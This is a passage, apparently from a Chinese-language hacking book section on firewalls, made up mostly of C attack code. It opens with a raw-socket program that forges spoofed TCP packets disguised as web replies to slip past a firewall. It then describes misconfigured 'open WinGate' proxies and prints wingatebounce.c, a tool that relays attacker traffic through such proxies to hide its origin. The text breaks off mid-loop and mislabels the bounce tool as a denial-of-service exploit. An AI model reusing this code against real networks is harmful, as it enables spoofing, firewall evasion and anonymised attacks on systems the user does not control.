

```c
NOP,

#define PAYLOAD_LEN 32
#define OPTSIZE 4
#define LEN (IP_SZ + TCP_SZ + PAYLOAD_LEN + OPTSIZE)

void main(int argc, char *argv[]) {
    int checksum(unsigned short *, int);
    int raw_socket(void);
    int write_raw(int, unsigned char *, int);
    unsigned long option = htonl(0x44000001); /* Timestamp, END */
    unsigned char *p;
    int s, c;
    struct ip *ip;
    struct tcphdr *tcp;

    if (argc != 2) {
        printf("Quid custodiet ipsos custodes?\n");
        printf("Usage: %s <destination IP>\n", argv[0]);
        return;
    }
    p = malloc(1500);
    memset(p, 0x00, 1500);

    if ((s = raw_socket()) < 0)
        return perror("socket");

    ip = (struct ip *) p;
    ip->ip_v = 0x4;
    ip->ip_hl = 0x5 + (OPTSIZE / 4);
    ip->ip_tos = 0x32;
    ip->ip_len = htons(LEN);
    ip->ip_id = htons(0xbeef);
    ip->ip_off = 0x0;
    ip->ip_ttl = 0xff;
    ip->ip_p = IPPROTO_TCP;
    ip->ip_sum = 0;
    ip->ip_src.s_addr = SRC_IP;
    ip->ip_dst.s_addr = inet_addr(argv[1]);

    /* Masquerade the packet as part of a legitimate answer */
    tcp = (struct tcphdr *) (p + IP_SZ + OPTSIZE);
    tcp->th_sport = htons(80);
    tcp->th_dport = 0xbeef;
    tcp->th_seq = 0x12345678;
    tcp->th_ack = 0x87654321;
    tcp->th_off = 5;
    tcp->th_flags = TH_ACK | TH_PUSH;
    tcp->th_win = htons(8192);
    tcp->th_sum = 0;

    /* Set the IP options */
    memcpy((void *) (p + IP_SZ), (void *) &option, OPTSIZE);

    c = checksum((unsigned short *) &(ip->ip_src), 8)
        + checksum((unsigned short *) tcp, TCP_SZ + PAYLOAD_LEN)
        + ntohs(IPPROTO_TCP + TCP_SZ);
    while (c >> 16) c = (c & 0xffff) + (c >> 16);
    tcp->th_sum = ~c;

    printf("Sending %s -> ", inet_ntoa(ip->ip_src));
    printf("%s\n", inet_ntoa(ip->ip_dst));

    if (write_raw(s, p, LEN) != LEN)
        perror("sendto");
}

int write_raw(int s, unsigned char *p, int len)
{
    struct ip *ip = (struct ip *) p;
    struct tcphdr *tcp;
    struct sockaddr_in sin;

    tcp = (struct tcphdr *) (ip + ip->ip_hl * 4);

    memset(&sin, 0x00, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = ip->ip_dst.s_addr;
    sin.sin_port = tcp->th_sport;

    return (sendto(s, p, len, 0, (struct sockaddr *) &sin,
                   sizeof(struct sockaddr_in)));
}

int raw_socket(void)
{
    int s, o = 1;

    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        return -1;

    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *) &o,
                    sizeof(o)) < 0)
        return (-1);

    return (s);
}

int checksum(unsigned short *c, int len)
{
    int sum = 0;
    int left = len;
    while (left > 1) {
        sum += *c++;
        left -= 2;
    }
    if (left)
        sum += *c & 0xff;

    return (sum);
}

/* ###EOF##### */
```

## WinGate

WinGate (www.wingate.net) 是一款代理服务器防火墙软件包，允许联网计算机在共享互联网连接的同时充当防火墙，阻止入侵者访问本地网络。WinGate 通过路由本地网络（家庭或企业）与互联网之间的流量和通信，以及自动为每个联网计算机分配所需的网络地址来工作。WinGate 共享的互联网连接可以是拨号调制解调器、ISDN、xDSL、有线调制解调器、卫星连接，甚至是专用 T1 电路。WinGate 的防护机制以其配置不良而闻名：它们没有将访问限制在本地网络的人员，而是为从 IP 欺骗到大规模 DoS 滥用的各种攻击敞开大门（参见 `wingatebounce.c` 和 `wingatecrash.c`），这通常被称为“开放型 WinGate”。

## 潜在风险

## 拒绝服务攻击

**摘要：** 这些漏洞攻击允许远程攻击者潜在地通过 DoS 攻击使防火墙瘫痪。

**攻击状态：** 系统崩溃。

**受影响版本：** 所有版本。

**利用代码：** `wingatebounce.c`。

```c
wingatebounce.c

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>

#define BUFSIZE 512
#define SOCKSPORT 1080

const char portclosed[] = "socks: Port closed/Permission denied/Something went wrong\n";

int
main (int argc, char **argv)
{
    int listensocket, insocket, outsocket;
    short listenport, destport;
    struct hostent *socks_he, *dest_he;
    struct sockaddr_in listen_sa, socks_sa;
    int sopts = 1, maxfd;
    char buffer[BUFSIZE];
    int length;
    fd_set rfds;

    if (argc != 5)
    {
        printf ("Usage: %s locallistenport sockshost desthost destport\n", argv[0]);
        exit (1);
    }

    if ((socks_he = gethostbyname (argv[2])) == NULL)
    {
        herror ("gethostbyname");
        exit (1);
    }

    memset (&socks_sa, 0, sizeof (struct sockaddr_in));
    memcpy (&socks_sa.sin_addr.s_addr, socks_he->h_addr_list[0], socks_he->h_length);
    if ((dest_he = gethostbyname (argv[3])) == NULL)
    {
        herror ("gethostbyname");
        exit (1);
    }

    /* no need for errorchecking. only fools mess these up */
    listenport = atoi (argv[1]);
    destport = atoi (argv[4]);

    listensocket = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt (listensocket, SOL_SOCKET, SO_REUSEADDR, &sopts, sizeof (int));

    memset (&listen_sa, 0, sizeof (struct sockaddr_in));

    listen_sa.sin_port = htons (listenport);
    listen_sa.sin_addr.s_addr = htonl (INADDR_ANY);

    socks_sa.sin_port = htons (SOCKSPORT);

    if (bind (listensocket, (struct sockaddr *) &listen_sa, sizeof (struct sockaddr_in)) == -1)
    {
        perror ("bind");
        exit (1);
    }
    if ((listen (listensocket, 1)) == -1)
    {
        perror ("listen");
        exit (1);
    }

    /* background stuff */
    switch (fork ())
    {
        case -1:
            perror ("fork");
            exit (1);
            break;
        case 0:
#ifndef MYDEBUG
            close (STDIN_FILENO);
            close (STDOUT_FILENO);
            close (STDERR_FILENO);
#endif
            if (setsid () == -1)
            {
                perror ("setsid");
                exit (1);
            }
            break;
        default:
            return 0;
    }

    insocket = accept (listensocket, NULL, 0);
    if (insocket == -1)
    {
        perror ("accept");
        exit (1);
    }
    close (listensocket);
    outsocket = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if ((connect (outsocket, (struct sockaddr *) &socks_sa, sizeof (struct sockaddr_in))) == -1)
    {
        perror ("connect");
        exit (1);
    }

    snprintf (buffer, 8192, "\x04\x01%c%c%c%c%c%c", (destport >> 8) & 0xFF, destport & 0xFF, /* <-- port */
              (char) dest_he->h_addr[0], (char) dest_he->h_addr[1], (char) dest_he->h_addr[2], (char) dest_he->h_addr[3]); /* <-- ip */

#ifdef MYDEBUG
    for (length = 0; length < 8; length++)
        printf ("%02X:", (unsigned char) buffer[length]);
    printf ("\n");
    for (length = 0; length < 8; length++)
        if (buffer[length] > 'A' && buffer[length] < 'z')
            printf (" %c:", (unsigned char) buffer[length]);
        else
            printf (" *:");
    printf ("\n");
#endif

    /* error checking sucks */
    send (outsocket, buffer, 9, 0);
    recv (outsocket, buffer, 8, 0);

    /* handle errors etc */
    if (buffer[1] == 0x5B)
        send (insocket, portclosed, sizeof (portclosed), 0);

#ifdef MYDEBUG
    for (length = 0; length < 8; length++)
        printf ("%02X:", (unsigned char) buffer[length]);
    printf ("\n");
    for (length = 0; length < 8; length++)
        if (buffer[length] > 'A' && buffer[length] < 'z')
            printf (" %c:", (unsigned char) buffer[length]);
        else
            printf (" *:");
    printf ("\n");
#endif

    maxfd = insocket > outsocket ? insocket : outsocket;
    while (1)
    {
        FD_ZERO (&rfds);
        FD_SET (insocket, &rfds);
        FD_SET (outsocket, &rfds);
        select (maxfd + 1, &rfds, NULL, NULL);
        if (FD_ISSET (insocket, &rfds))
        {
            length = recv (insocket, buffer, sizeof (buffer), 0);
            if (length == -1 || length == 0)
                break;
            if ((send (outsocket, buffer, length, 0)) == -1)
                break;
        }
        if (FD_ISSET (outsocket, &rfds))
        {
            length = recv (outsocket, buffer, sizeof (buffer), 0);
            if (length == -1 || length == 0)
```

